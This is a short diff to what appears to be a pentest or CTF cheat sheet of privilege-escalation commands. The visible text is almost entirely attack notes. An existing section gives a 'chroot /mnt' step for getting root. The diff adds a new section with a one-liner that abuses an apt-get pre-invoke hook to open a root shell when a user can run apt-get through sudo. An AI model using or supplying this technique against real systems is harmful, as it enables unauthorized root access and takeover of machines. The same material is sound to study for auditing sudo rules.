@@ -67,3 +67,8 @@
 ### RCE <getting root with that user>
 
      chroot /mnt
+
+### PRIVESC WITH APT-GET IF A USER CAN RUN IT WITH SUDO
+
+    sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+    
